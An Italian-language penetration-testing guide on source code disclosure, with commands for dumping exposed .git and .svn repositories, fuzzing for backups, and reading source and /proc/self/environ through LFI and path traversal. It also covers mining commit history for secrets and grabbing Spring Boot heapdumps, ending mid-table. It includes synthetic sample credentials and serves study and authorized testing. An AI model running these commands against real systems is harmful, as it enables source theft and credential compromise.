---
title: 'Source Code Disclosure: Vulnerabilità, Pentest e Fix'
slug: source-code-disclosure
description: 'Source Code Disclosure: come backup e file esposti rivelano il codice sorgente. Tecniche di pentest, rischi della vulnerabilità e soluzioni per difendersi.'
image: /source-code-disclosure-pentest.webp
draft: false
date: 2026-03-19T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - Source Code Disclosure
  - Git Exposure
  - Information Disclosure
  - ''
  - ''
---

# Source Code Disclosure: Come Trovare e Sfruttare il Codice Sorgente Esposto

**Source code disclosure** (o *source code disclosure vulnerability*) è una vulnerabilità che permette di leggere il codice sorgente di un'applicazione o i file che lo contengono: repository `.git` esposti, backup dimenticati, handler mal configurati, LFI o source map. In un pentest si verifica cosa è realmente esposto e si valuta l'impatto su codice, credenziali e sistemi collegati.

Il caso più classico: `curl https://target.com/.git/HEAD` risponde `ref: refs/heads/main`. Se i file del repository sono raggiungibili, in pochi minuti ricostruisci codice, branch e ogni password mai committata, anche quella cancellata dopo. La stessa esposizione arriva però da un `.svn` dimenticato, un `config.php.bak`, un file `.swp` di Vim, una LFI con `php://filter`, una DLL in `/bin/` o una source map JavaScript lasciata in produzione.

In questa guida vedi come trovarla, come sfruttarla fino ai segreti validi, come passare dal sorgente alla vulnerabilità e come chiuderla. Satellite operativo della [guida pillar File & Path Attacks](https://hackita.it/articoli/file-path-attacks-guida-completa/). Tutti gli esempi vanno usati solo su sistemi autorizzati o in lab (HTB, VulnHub, ambienti tuoi); `target.com` è l'host d'esempio.

## Cos'è la Source Code Disclosure?

> **Source code disclosure** è l'esposizione non autorizzata del codice sorgente di un'applicazione web o di un'API: il file viene servito in chiaro invece di essere eseguito, oppure l'attaccante raggiunge repository, backup e file di build che contengono il codice. È una forma di *information disclosure*: il codice è già un'informazione sensibile, ma il vero valore sta in ciò che contiene (credenziali, chiavi, logica, endpoint nascosti).

Una **source code disclosure vulnerability** nasce da un errore del server (handler PHP non attivo), da un errore di deploy (`.git/` nella document root), da un'altra vulnerabilità (LFI, arbitrary file read) o da un artefatto di build (source map, file di backup).

### Source code disclosure, information disclosure e file read

I termini si sovrappongono. Questa è la mappa:

| Termine                                                                     | Cosa indica                                                                                                 |
| --------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| **Source code disclosure**                                                  | Ciò che esce è il codice sorgente dell'applicazione o un suo contenuto utile                                |
| **Information disclosure / information leakage vulnerability**              | Categoria più ampia: errori verbosi, header, versioni, commenti, file di configurazione, directory listing  |
| **Web application information disclosure**                                  | Fuga dalla logica applicativa: stack trace, endpoint di debug, API che restituiscono campi in più           |
| **Web server information disclosure vulnerability**                         | Fuga dal server: banner, `server-status`, directory listing, file di default                                |
| **[Arbitrary file read](https://hackita.it/articoli/arbitrary-file-read/)** | Il meccanismo: leggi file a scelta. Se leggi i sorgenti, ottieni una source code disclosure                 |
| **[LFI](https://hackita.it/articoli/lfi/)**                                 | Il meccanismo: l'app include un file scelto da te. Con `php://filter` leggi il sorgente invece di eseguirlo |
| **[Backup exposure](https://hackita.it/articoli/backup-exposure/)**         | La causa: copie di file lasciate sul server (`.bak`, `.old`, archivi) che contengono il codice              |

La distinzione conta nel report: la causa decide il fix. Un backup si rimuove, una LFI si corregge nel codice, un handler si riattiva nel web server.

### Classificazione: OWASP e CWE

La classificazione dipende dalla causa tecnica, non esiste una categoria unica.

* **OWASP Top 10 2025, A01 – Broken Access Control**: file e repository raggiungibili da chi non dovrebbe (backup, `.git`, arbitrary file read).
* **OWASP Top 10 2025, A02 – Security Misconfiguration**: directory listing attivo, handler non eseguito, debug in produzione, `web.config` mancante. Nel Top 10 2021 questa categoria era A05.
* **OWASP Top 10 2025, A03 – Software Supply Chain Failures**: rientra solo quando il segreto trovato (token CI/CD, accesso alla pipeline) permette di manomettere build e distribuzione, non per la semplice lettura del codice.
* **Top 10 2021**: le stesse cause stavano in A01:2021 e A05:2021. Se un report usa ancora quella versione, indicalo.
* **CWE tipiche**: CWE-540 (informazioni sensibili nel codice sorgente), CWE-541 (include file), CWE-538 (file o directory accessibili dall'esterno), CWE-548 (directory listing), CWE-552 (file accessibili a terzi), CWE-200 (esposizione generica di informazioni).
* **WASC-13**: Information Leakage.
* **OWASP WSTG**: WSTG-CONF-04 (backup e file non referenziati) e WSTG-INFO-05 (contenuto delle pagine) sono i test di riferimento.

## Perché è Pericolosa

Il codice sorgente trasforma un test black-box in un test white-box: non cerchi più alla cieca, leggi.

| Cosa trovi                                                           | Cosa ci fai                                                                                                                             |
| -------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| Credenziali hardcoded, `.env`, token CI/CD                           | Accesso a DB, cloud, GitLab/GitHub                                                                                                      |
| Segreti di firma (`SECRET_KEY`, `APP_KEY`, secret JWT, `machineKey`) | Forgiare sessioni e token, in alcuni stack arrivare a RCE                                                                               |
| Logica di autenticazione e autorizzazione                            | Bypass, [IDOR](https://hackita.it/articoli/idor/) mirati, [privilege escalation](https://hackita.it/articoli/privilege-escalation-web/) |
| Query SQL e filtri                                                   | [SQL Injection](https://hackita.it/articoli/sql-injection/) trovata leggendo, non provando                                              |
| Endpoint nascosti e pannelli admin                                   | Superficie che nessuna wordlist avrebbe trovato                                                                                         |
| Logica di [upload](https://hackita.it/articoli/file-upload-attack/)  | Bypass dei filtri su misura, poi [web shell](https://hackita.it/articoli/web-shell/)                                                    |
| Storico dei commit                                                   | Segreti rimossi ma ancora recuperabili                                                                                                  |

## Come Finisce in Chiaro il Codice Sorgente

| Vettore                   | Causa                                                       | Primo test                     |
| ------------------------- | ----------------------------------------------------------- | ------------------------------ |
| `.git/` esposto           | Deploy con `git pull` nella document root                   | `/.git/HEAD`                   |
| `.svn/`, `.hg/`, `.bzr/`  | Stesso errore con altri VCS                                 | `/.svn/wc.db`, `/.hg/requires` |
| `.DS_Store`               | Metadati del Finder copiati sul server                      | `/.DS_Store`                   |
| File di backup e swap     | Editor e copie manuali (`config.php.bak`, `.index.php.swp`) | Fuzzing con estensioni         |
| Handler non attivo        | PHP/ASP non eseguito dopo upgrade o config errata           | Risposta che contiene `<?php`  |
| Script di download        | `download.php?file=` senza whitelist                        | `?file=download.php`           |
| LFI / arbitrary file read | Wrapper `php://filter`, traversal, `/proc/self/cwd`         | Vedi sezione PHP               |
| Artefatti di build        | Source map `.js.map`, `.class`, `.dll`, `.pyc`              | `//# sourceMappingURL=`        |
| Repository pubblici       | Repo GitHub/GitLab dell'azienda                             | Dork su GitHub                 |

## Discovery: Trovare il Source Code

### Test manuale rapido

Attenzione ai falsi positivi: una SPA o un WAF possono rispondere 200 a qualsiasi path. Verifica sempre il **contenuto**, non solo lo status code.

```bash
# Git: a real exposure returns a ref, not an HTML page
curl -s https://target.com/.git/HEAD | grep -E '^ref: refs/heads/' && echo "[+] .git exposed"
curl -s https://target.com/.git/config | grep -F '[core]' && echo "[+] .git/config exposed"

# SVN >= 1.7 keeps a SQLite database
curl -s https://target.com/.svn/wc.db | head -c 15 | grep -a 'SQLite format' && echo "[+] .svn/wc.db exposed"

# Mercurial and Bazaar
curl -s https://target.com/.hg/requires | grep -E 'revlogv1|store' && echo "[+] .hg exposed"
curl -s https://target.com/.bzr/README | grep -F 'Bazaar' && echo "[+] .bzr exposed"

# macOS Finder metadata starts with the magic bytes "Bud1"
curl -s https://target.com/.DS_Store | head -c 8 | grep -a 'Bud1' && echo "[+] .DS_Store exposed"
```

Un dettaglio che fa perdere repository: **`/.git/` che risponde 403 non significa protetto**. Con directory listing disattivato il server blocca la cartella, ma i singoli file (`/.git/HEAD`, `/.git/index`) possono restare raggiungibili, e [git-dumper](https://github.com/arthaud/git-dumper) ricostruisce comunque il repository. Testa sempre i file, mai solo la directory. Vale anche al contrario: un 403 al posto di un 404 conferma che il path esiste.

### Fuzzing con ffuf

Con [ffuf](https://hackita.it/articoli/ffuf/) (o [gobuster](https://hackita.it/articoli/gobuster/)) cerchi i file chiave in blocco:

```bash
cat > vcs-files.txt << 'EOF'
.git/HEAD
.git/config
.git/index
.git/logs/HEAD
.git/packed-refs
.svn/entries
.svn/wc.db
.hg/requires
.bzr/README
.DS_Store
.env
.env.production
.idea/workspace.xml
.vscode/sftp.json
docker-compose.yml
composer.json
package.json
EOF

# -ac auto-calibrates and drops catch-all 200 responses (SPA, WAF)
ffuf -u https://target.com/FUZZ -w vcs-files.txt -mc 200 -ac

# Broader list of common leftovers shipped with SecLists
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -mc 200 -ac
```

### Su molti host: sottodomini e microservizi

Ogni servizio ha il suo deploy, quindi il suo possibile `.git`. Parti dall'enumerazione ([amass](https://hackita.it/articoli/amass/), [assetfinder](https://hackita.it/articoli/assetfinder/)) e testa tutto con [httpx](https://hackita.it/articoli/httpx/):

```bash
assetfinder --subs-only target.com > subs.txt

# Probe a single path on every host and keep only real git responses
cat subs.txt | httpx -path /.git/HEAD -mr 'ref: refs/heads/' -silent
cat subs.txt | httpx -path /.env -mr 'APP_|DB_|SECRET|PASSWORD' -silent
```

### Nuclei

```bash
nuclei -u https://target.com \
  -t http/exposures/configs/git-config.yaml \
  -t http/exposures/configs/exposed-svn.yaml
```

### Google Dorks e GitHub

```text
site:target.com inurl:.git
site:target.com intitle:"index of" ".git"
site:target.com ext:bak | ext:old | ext:swp | ext:sql | ext:env
```

Per i repository pubblici dell'azienda cerca su GitHub con `org:nomeazienda password` o `org:nomeazienda "BEGIN RSA PRIVATE KEY"`: spesso il codice non è esposto dal sito ma da un repo dimenticato o da un account personale di uno sviluppatore.

## .git Esposto: Exploitation Completa

### Dump con git-dumper

```bash
pipx install git-dumper
git-dumper https://target.com/.git/ ./target-source
cd target-source
ls -la
```

**Attenzione:** esegui il dump in una VM o in un container. Un `.git/config` controllato dal target (cioè da un attaccante, in uno scenario ostile) può far eseguire comandi sulla tua macchina durante il checkout. Se il server risponde in modo anomalo, git-dumper ha `--any-status` per accettare risposte non-200 con contenuto valido, `-X POST` per cambiare metodo HTTP e `--proxy` per passare da [Burp Suite](https://hackita.it/articoli/burp-suite/).

```bash
git-dumper --proxy http://127.0.0.1:8080 https://target.com/.git/ ./target-source
```

Con directory listing attivo git-dumper scarica tutto ricorsivamente (e funziona anche un `wget` mirror). Senza listing parte da `HEAD`, `index`, `refs` e `logs` e ricostruisce gli oggetti dagli hash che trova: ottieni molto, ma i **packfile** possono sfuggire.

```bash
# Directory listing enabled: plain recursive mirror, then restore the working tree
wget --mirror --include-directories=/.git https://target.com/.git/
cd target.com && git checkout -- .
```

| Tool                          | Quando usarlo                                                                     |
| ----------------------------- | --------------------------------------------------------------------------------- |
| git-dumper                    | Primo tentativo, il più affidabile                                                |
| GitTools (Dumper + Extractor) | Se git-dumper si ferma: Extractor ricostruisce i commit da un dump parziale       |
| GitHack                       | Ricostruisce l'albero dei file leggendo `.git/index`, utile con listing disattivo |
| GitHacker                     | Dump completo di branch, stash e tag da un `.git` esposto                         |
| dvcs-ripper (`rip-git.pl`)    | Stesso approccio anche per SVN, Hg, Bzr, CVS                                      |

### Recupero manuale: quando gli strumenti falliscono

Se il WAF blocca il traffico di git-dumper o il repository è strano, il recupero a mano è semplice perché ogni oggetto vive a un URL prevedibile: `/.git/objects/<primi 2 caratteri dell'hash>/<resto dell'hash>`.

```bash
# Local empty repository: git can read any loose object dropped into it
git init -q manual-dump && cd manual-dump

fetch_object() {
  local h=$1
  mkdir -p ".git/objects/${h:0:2}"
  curl -sf -o ".git/objects/${h:0:2}/${h:2}" "https://target.com/.git/objects/${h:0:2}/${h:2}" \
    || echo "[-] ${h} missing (probably inside a packfile)"
}

# HEAD points to the branch, the branch file contains the commit hash
curl -s https://target.com/.git/HEAD                 # ref: refs/heads/main
commit=$(curl -s https://target.com/.git/refs/heads/main)
fetch_object "$commit"
git cat-file -p "$commit"                            # tree, parent, author, message

# Walk down: commit -> tree -> blobs (the files)
tree=$(git cat-file -p "$commit" | awk '/^tree/{print $2}')
fetch_object "$tree"
git cat-file -p "$tree"                              # file names with their blob hashes
```

Due scorciatoie per trovare gli hash:

```bash
# Every commit hash, author and message ever made on this checkout
curl -s https://target.com/.git/logs/HEAD

# The index lists every tracked file with its blob hash
curl -s -o .git/index https://target.com/.git/index
git ls-files --stage
```

Se gli oggetti non sono "loose" ma dentro un packfile, controlla `info/packs` (presente quando il repo è servito in modo "dumb" via HTTP) e scarica `.pack` e `.idx`:

```bash
for pack in $(curl -s https://target.com/.git/objects/info/packs | awk '/^P /{print $2}'); do
  for ext in pack idx; do
    curl -sf -o ".git/objects/pack/${pack%.pack}.$ext" "https://target.com/.git/objects/pack/${pack%.pack}.$ext"
  done
done
git log --all --oneline | head
```

### Prima occhiata al repository

```bash
git log --all --oneline --graph | head -20
git branch -a
git stash list
git remote -v
git log --all --format='%an <%ae>' | sort -u
```

Cosa guardi: branch dimenticati (`dev`, `old`, `hotfix`), stash con codice mai committato, autori ed email (utenti validi per [password spraying](https://hackita.it/articoli/password-spraying/) e phishing) e il `remote`, che a volte contiene un token.

```text
[remote "origin"]
    url = https://deploy-bot:glpat-8fK2xQ7mZ1pL9vNc4RtB@gitlab.company.com/team/webapp.git
```

Un URL con credenziali incorporate vale già da solo un possibile accesso al GitLab aziendale, da validare con il metodo minimo descritto più sotto.

### Credenziali nel codice attuale

```bash
cat .env 2>/dev/null

grep -rIn -E "password|passwd|secret|api[_-]?key|token|credential" \
  --include="*.php" --include="*.py" --include="*.js" \
  --include="*.yml" --include="*.yaml" --include="*.json" \
  --include="*.env" --include="*.conf" --include="*.xml" \
  . --exclude-dir=node_modules --exclude-dir=.git
```

### Credenziali nella history

La history è il motivo per cui un `.git` esposto vale più di un normale leak del codice: ciò che è stato cancellato **resta nei commit**, se gli oggetti sono stati recuperati.

```bash
# Files that existed once and were deleted: .env, keys, dumps, configs
git log --all --diff-filter=D --name-only --pretty=format: | sort -u | grep -iE '\.env|\.pem|id_rsa|\.sql|\.bak|config|secret|passw'

# Read a deleted file from the commit right before its deletion
git show a1b2c3d^:.env

# Pickaxe: every commit that added or removed the string
git log --all -p -S'password' | head -100
git log --all -p -S'AKIA' | head -50
git log --all -p -S'-----BEGIN' | head -50

# Regex version: assignments that look like secrets
git log --all -p -G'(api[_-]?key|secret|token)\s*[:=]' | head -100

# Direct grep across every commit (slow on big repositories)
git grep -I -n -E 'AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]+|-----BEGIN (RSA|OPENSSH|EC) PRIVATE KEY-----' $(git rev-list --all)

# Commit messages that hint at security fixes or leaked data
git log --all --oneline -i --grep='secret\|password\|credential\|token\|key\|fix.*vuln\|cve'
```

Output **illustrativo** (dati sintetici) di come appare una credenziale nella storia:

```text
commit d4e5f6g7h8i9j0k
Author: Mario Rossi <mario.rossi@company.com>
Date:   Mon Jan 15 10:00:00 2026 +0100

    Add database configuration

+++ b/config/database.yml
+production:
+  adapter: postgresql
+  host: db-prod.internal
+  database: webapp_production
+  username: webapp_admin
+  password: Pr0d_DB_P@ssw0rd!2024
```

```text
commit h7i8j9k0l1m2n3o
Author: Laura Bianchi <laura.bianchi@company.com>
Date:   Fri Dec 20 15:30:00 2025 +0100

    Deploy script - REMOVE BEFORE MERGE!!

+++ b/scripts/deploy.sh
+export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

Il commento "REMOVE BEFORE MERGE" non è stato rispettato. E anche se fosse stato rimosso nel commit dopo, il segreto resterebbe nella storia.

### Scansione automatica con trufflehog

trufflehog combina pattern, entropia e **verifica live** dei segreti trovati. Occhio al sottocomando: `trufflehog filesystem` legge solo i file correnti, mentre per la storia serve `trufflehog git`.

```bash
trufflehog git file://./target-source --results=verified,unknown
```

```text
Found verified result 🐷🔑
Detector Type: AWS
Raw result: AKIAIOSFODNN7EXAMPLE
File: scripts/deploy.sh
Commit: h7i8j9k0l1m2n3o
```

La verifica **invia davvero** la credenziale al provider (AWS, GitHub, Stripe...). In un engagement controlla che le regole d'ingaggio lo permettano; altrimenti usa `--no-verification` e valida a mano solo ciò che è in scope.

Alternative leggere: `git-secrets` (`git secrets --register-aws` e poi `git secrets --scan-history`), gitleaks e gitrob; per i repository dell'azienda su GitHub, git-hound e gitdorker automatizzano i dork.

## .svn, .hg, .bzr e CVS Esposti

### Subversion

Con SVN \< 1.7 il file `entries` elenca tutto. Dalla 1.7 serve `wc.db` (SQLite) e i file veri stanno in `.svn/pristine/`, indicizzati per SHA-1:

```bash
curl -s -o wc.db https://target.com/.svn/wc.db

# For every file: its path and the URL of its pristine copy
sqlite3 -separator ' ' wc.db "SELECT local_relpath, '.svn/pristine/' || substr(checksum,7,2) || '/' || substr(checksum,7) || '.svn-base' FROM NODES WHERE kind='file' AND checksum IS NOT NULL;" |
while read -r path url; do
  curl -sf --create-dirs -o "dump/$path" "https://target.com/$url"
done
```

### Mercurial, Bazaar, CVS

```bash
# dvcs-ripper handles git, svn, hg, bzr and cvs
rip-hg.pl -v -u https://target.com/.hg/
rip-bzr.pl -v -u https://target.com/.bzr/
```

### .DS\_Store: la mappa dei file

Il `.DS_Store` generato dal Finder elenca i nomi dei file della cartella, anche quelli che nessuna pagina linka.

```bash
curl -s -o ds_store https://target.com/.DS_Store
pip install ds_store
python3 - << 'EOF'
from ds_store import DSStore

# Print every filename recorded by Finder in this directory
with DSStore.open("ds_store", "r") as store:
    print("\n".join(sorted({entry.filename for entry in store})))
EOF
```

I nomi che escono (`config_backup.zip`, `database_dump.sql`, `admin_panel.php`) vanno subito richiesti al server. Se la directory è profonda, ds\_store\_exp ricostruisce l'albero in modo ricorsivo.

## File di Backup, Swap e Residui degli Editor

Gli sviluppatori lavorano sul server e gli editor lasciano copie. Il [backup exposure](https://hackita.it/articoli/backup-exposure/) è una delle fonti più comuni di source code disclosure (WSTG-CONF-04).

```bash
cat > files.txt << 'EOF'
index.php
config.php
wp-config.php
settings.py
database.yml
web.config
login.php
EOF

cat > suffixes.txt << 'EOF'
.bak
.old
.orig
.save
.swp
.txt
.zip
.tar.gz
~
EOF

# FILE and EXT are combined: config.php.bak, index.php~, ...
ffuf -u https://target.com/FILEEXT -w files.txt:FILE -w suffixes.txt:EXT -mc 200 -ac
```

Altri nomi da provare: `.index.php.swp` (swap di Vim, stesso nome con punto iniziale), `index.php.swo`, `.config.php.swp`, `Copy of index.php`, `index_old.php`, `index.php.2024`, archivi interi come `www.zip`, `backup.tar.gz`, `site.sql`. BFAC automatizza questa generazione di varianti.

```bash
# Recover the content of a Vim swap file
curl -s -O https://target.com/.index.php.swp
vim -r .index.php.swp

# Or just pull out readable strings
strings .index.php.swp | head -50
```

Verifica sempre l'evidenza: un `.zip` che risponde 200 va scaricato e aperto per capire se contiene davvero codice (e non una pagina HTML di errore servita con status 200).

## PHP Source Code Disclosure

La **PHP source code disclosure** ha quattro cause ricorrenti.

### 1. PHP non viene eseguito

Dopo un upgrade o una configurazione sbagliata (un `location` Nginx che non passa il file a PHP-FPM, un modulo Apache disattivato, una cartella `uploads/` senza handler) il server serve il `.php` come testo:

```bash
curl -s https://target.com/config.php
# <?php
# $db_host = 'localhost';
# $db_user = 'admin';
# $db_pass = 'SecretPass123!';

# Fast check: raw PHP tags in the body mean the interpreter is not running
curl -s https://target.com/index.php | head -5 | grep -F '<?php' && echo "[+] PHP source disclosed"
```

Controlla anche l'estensione `.phps` (su Apache con l'handler `x-httpd-php-source` mostra il sorgente colorato) e i file `.inc`, che molti server non associano a PHP e servono in chiaro.

### 2. Script di download senza whitelist

Una pagina come `download.php?file=report.pdf` che apre qualsiasi path permette di scaricare i sorgenti dell'applicazione, a partire dallo script stesso:

```bash
curl -s "https://target.com/download.php?file=download.php"
curl -s "https://target.com/download.php?file=../config/database.php"
```

È un caso di [arbitrary file read](https://hackita.it/articoli/arbitrary-file-read/) e di [path traversal](https://hackita.it/articoli/path-traversal/).

### 3. LFI con php\://filter

Se l'app include un file scelto da te, il wrapper `php://filter` restituisce il sorgente in base64 invece di eseguirlo. È la tecnica standard con una [LFI](https://hackita.it/articoli/lfi/):

```bash
curl -s "https://target.com/index.php?page=php://filter/convert.base64-encode/resource=config" | base64 -d

# If a filter blocks "base64", rot13 is a drop-in alternative
curl -s "https://target.com/index.php?page=php://filter/read=string.rot13/resource=config" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

Se l'app aggiunge da sola `.php` in coda al parametro, passa `resource=config` e non `config.php`. Una volta letto `config.php` hai le credenziali del database; leggendo il codice del login trovi gli altri file da richiedere.

### 4. Legacy IIS

Sui vecchi IIS un `.asp` richiesto come `login.asp::$DATA` restituiva il sorgente. Oggi è raro, ma lo trovi ancora su sistemi mai aggiornati.

### Quando non conosci il path dell'applicazione

Con una LFI o un arbitrary file read su Linux non serve indovinare dove sta il codice: lo chiede al processo stesso.

```bash
# How was the app launched? (arguments are NUL separated)
curl -s "https://target.com/download.php?file=../../../../proc/self/cmdline" | tr '\0' ' '

# Read the app source from the process working directory
curl -s "https://target.com/download.php?file=../../../../proc/self/cwd/app.py"
curl -s "https://target.com/download.php?file=../../../../proc/self/cwd/index.php"

# Environment variables often hold DB credentials and secret keys
curl -s "https://target.com/download.php?file=../../../../proc/self/environ" | tr '\0' '\n'
```

## Altri Linguaggi e Artefatti di Build

Il codice precompilato non è al sicuro: si decompila. Ma attenzione alla distinzione nel report: una DLL o una `.class` decompilabile espone la logica, non necessariamente il sorgente originale (commenti, nomi di variabili locali e struttura dei file si perdono).

### Java

`/WEB-INF/` contiene `web.xml` e `classes/`. Non dovrebbe essere raggiungibile, ma lo diventa con path traversal o con Tomcat dietro un reverse proxy che normalizza male i path:

```bash
curl -s --path-as-is "https://target.com/..;/WEB-INF/web.xml"
curl -s -O --path-as-is "https://target.com/..;/WEB-INF/classes/com/app/LoginServlet.class"
jadx -d out LoginServlet.class
```

### Python

I file `.pyc` in `__pycache__/` si decompilano con `pycdc`:

```bash
curl -s -O https://target.com/__pycache__/app.cpython-311.pyc
pycdc app.cpython-311.pyc
```

### JavaScript Source Map

Una build di produzione con source map pubblica restituisce i sorgenti originali del frontend, con commenti, route API e a volte chiavi (utile per le [API moderne](https://hackita.it/articoli/api-modern-web-attacks-guida-completa/)).

```bash
# The last line of the bundle points to the map
curl -s https://target.com/static/js/main.js | tail -c 200
# //# sourceMappingURL=main.js.map

# Rebuild the original source tree from the map
sourcemapper -url https://target.com/static/js/main.js.map -output ./sourcemap-out
grep -rIn -E "apiKey|secret|token|Authorization|/api/" ./sourcemap-out
```

## Source Code Disclosure in ASP.NET Apps

In ASP.NET va distinto cosa è davvero sorgente, cosa è configurazione e cosa è un assembly compilato. Non ogni file raggiungibile è una vulnerabilità.

Per ASP.NET Core su IIS, la documentazione Microsoft spiega che se `web.config` manca, ha il nome sbagliato o impedisce l'avvio normale del sito, IIS può servire file sensibili della cartella dell'app, in particolare `{ASSEMBLY}.runtimeconfig.json`, `{ASSEMBLY}.deps.json` e `{ASSEMBLY}.xml` (documentazione XML). Con `web.config` presente e sito avviato, quei file non vengono serviti. Microsoft indica di non rimuovere mai `web.config` da un deployment di produzione.

Primo giro di test, con lo status code e la dimensione di ogni file (l'assembly name lo ricavi da uno stack trace, da `blazor.boot.json` o dal nome della DLL in `/bin/`):

```bash
for f in web.config Web.Debug.config Web.Release.config appsettings.json appsettings.Production.json \
         elmah.axd trace.axd Application.deps.json Application.runtimeconfig.json Application.xml \
         bin/Application.dll Application.pdb; do
  curl -s -o /dev/null -w "%{http_code} %{size_download} /$f\n" "https://target.com/$f"
done
```

| File                                              | Test (autorizzato)           | Evidenza attesa                                         | Rischio e fix                                                                                                                                                                      |
| ------------------------------------------------- | ---------------------------- | ------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `web.config`                                      | `curl` sul path              | Su IIS normale 404 (file nascosto). 200 con XML è grave | Connection string e `machineKey`. Un `machineKey` leggibile permette di forgiare ViewState (ysoserial.net). Fix: mai rimuovere o rinominare `web.config`, request filtering attivo |
| `Web.Debug.config`, `Web.Release.config`          | `curl` sul path              | 200 con XML di trasformazione                           | Spesso contengono le connection string di produzione. Fix: non pubblicarli                                                                                                         |
| `appsettings.json`, `appsettings.Production.json` | `curl` sul path              | 200 con JSON e `ConnectionStrings`                      | Raggiungibile solo se il file finisce in `wwwroot` o in una cartella servita come statica. Fix: segreti in variabili d'ambiente o secret manager                                   |
| `*.runtimeconfig.json`, `*.deps.json`, `*.xml`    | `curl` sul path              | 200 con JSON/XML                                        | Versioni runtime, dipendenze (CVE note) e nomi di metodi. Rischio basso da soli. Fix: `web.config` presente                                                                        |
| `bin/*.dll`                                       | `curl -O`                    | 200 con binario `MZ` (di default IIS blocca `/bin/`)    | Assembly decompilabile con `ilspycmd`: logica e costanti, non sorgente originale. Fix: request filtering, correggere il traversal                                                  |
| `*.pdb`                                           | `curl -O`                    | 200 con file di debug                                   | Path di build e nomi dei file sorgente; il codice solo se incorporato (embedded source). Fix: non pubblicare i simboli                                                             |
| `Properties/PublishProfiles/*.pubxml`             | `curl` sul path              | 200 con XML                                             | Dati di Web Deploy e a volte credenziali di pubblicazione. Fix: non pubblicare la cartella                                                                                         |
| `elmah.axd`, `trace.axd`                          | `curl` sul path              | 200 con log o trace                                     | Stack trace, URL, a volte cookie e sessioni: rischio alto. Fix: disattivare o proteggere con autenticazione                                                                        |
| Blazor WebAssembly `_framework/*.dll`             | `curl` su `blazor.boot.json` | Elenco di DLL pubbliche                                 | Pubbliche **per design**: non è una vulnerabilità. Cerca segreti hardcoded dentro le DLL                                                                                           |

Dopo aver scaricato un assembly:

```bash
ilspycmd Application.dll -o ./decompiled

# Strings in .NET assemblies are UTF-16: look for hardcoded secrets
strings -e l Application.dll | grep -iE 'password|secret|connectionstring|apikey|bearer'
```

## Information Disclosure Correlata

La source code disclosure è il caso estremo. Intorno ci sono tante **web application information disclosure** e **web server information disclosure** che da sole non danno il codice ma ti portano ai file giusti.

| File o endpoint                                     | Cosa rivela e come lo sfrutti                                                                                                                               |
| --------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `phpinfo.php`, `info.php`                           | Versione PHP, `document_root`, `disable_functions`, `open_basedir`, variabili d'ambiente, `upload_tmp_dir`: serve per costruire una catena LFI verso RCE    |
| `/server-status` (Apache)                           | Richieste in corso, URL interni, IP dei client                                                                                                              |
| `/actuator/env`, `/actuator/heapdump` (Spring Boot) | Variabili d'ambiente e memoria dell'app con segreti                                                                                                         |
| Debug Django (`DEBUG=True`)                         | La pagina 404 elenca tutti gli URL pattern; gli errori mostrano righe di codice e settings                                                                  |
| Laravel con debug attivo (Ignition)                 | Stack trace con sorgente; su versioni vecchie vulnerabili esiste anche RCE (CVE-2021-3129)                                                                  |
| Console Werkzeug/Flask (`/console`)                 | Con una LFI ricavi il PIN leggendo `/etc/machine-id`, il MAC (`/sys/class/net/eth0/address`) e il path dell'app: da lettura file a RCE                      |
| `composer.lock`, `package.json`, `requirements.txt` | Versioni esatte delle dipendenze, quindi CVE note                                                                                                           |
| `.env`, `docker-compose.yml`, `.gitlab-ci.yml`      | Segreti e topologia dell'infrastruttura                                                                                                                     |
| `.vscode/sftp.json`, `.idea/workspace.xml`          | Credenziali SFTP e path di progetto lasciati dall'IDE                                                                                                       |
| `robots.txt`, `sitemap.xml`                         | Non è un controllo di accesso e non è una vulnerabilità: elenca path che l'azienda non vuole indicizzare, quindi un ottimo punto di partenza per il fuzzing |
| Header `Server`, `X-Powered-By`                     | Stack e versioni                                                                                                                                            |

```bash
# Banner and technology headers
curl -sI https://target.com | grep -iE '^(server|x-powered-by|x-aspnet-version|x-generator):'

# Verbose errors: force a type error and read the stack trace
curl -s "https://target.com/index.php?id[]=1" | head -30

# Spring Boot heap dump: secrets are stored as plain strings in memory
curl -s -O https://target.com/actuator/heapdump
strings heapdump | grep -iE 'password=|secret|jdbc:|Authorization' | head
```

I messaggi d'errore verbosi vanno raccolti con Burp: in Repeater cambi tipo e lunghezza dei parametri e leggi cosa restituisce l'app.

## Dal Sorgente alla Vulnerabilità

Hai il codice. Il passo successivo è trasformarlo in finding. Parti dai sink pericolosi, dalle route e dai punti di autenticazione.

```bash
# PHP: dangerous sinks
grep -rIn -E '\b(eval|assert|system|exec|passthru|shell_exec|popen|proc_open|unserialize)\s*\(' --include='*.php' .
grep -rIn -E '\b(include|require)(_once)?\s*[\(\$]' --include='*.php' . | grep -E '\$_(GET|POST|REQUEST|COOKIE)'

# User input flowing into SQL
grep -rIn -E '\$_(GET|POST|REQUEST|COOKIE)\[' --include='*.php' . | grep -iE 'select|insert|update|delete|query'

# Python / Flask and Node: command execution, unsafe deserialization, template injection
grep -rIn -E 'subprocess|os\.system|eval\(|pickle\.loads|yaml\.load\(|render_template_string' --include='*.py' .
grep -rIn -E 'child_process|eval\(|new Function|vm\.run' --include='*.js' . --exclude-dir=node_modules

# Hidden routes and admin endpoints nobody linked
grep -rIn -E "@app\.route|app\.(get|post|put|delete)\(|Route::(get|post)" .

# Quick static analysis pass
semgrep --config p/owasp-top-ten --metrics=off .
```

Poi la catena dipende da cosa trovi:

| Nel codice trovi                                  | Prossimo passo                                                                                                                                                       |
| ------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Query concatenate con input utente                | [SQL Injection](https://hackita.it/articoli/sql-injection/) mirata, poi [sqlmap](https://hackita.it/articoli/sqlmap/) sul parametro esatto                           |
| `exec`, `system`, `shell_exec` con input          | [Command injection](https://hackita.it/articoli/command-injection/)                                                                                                  |
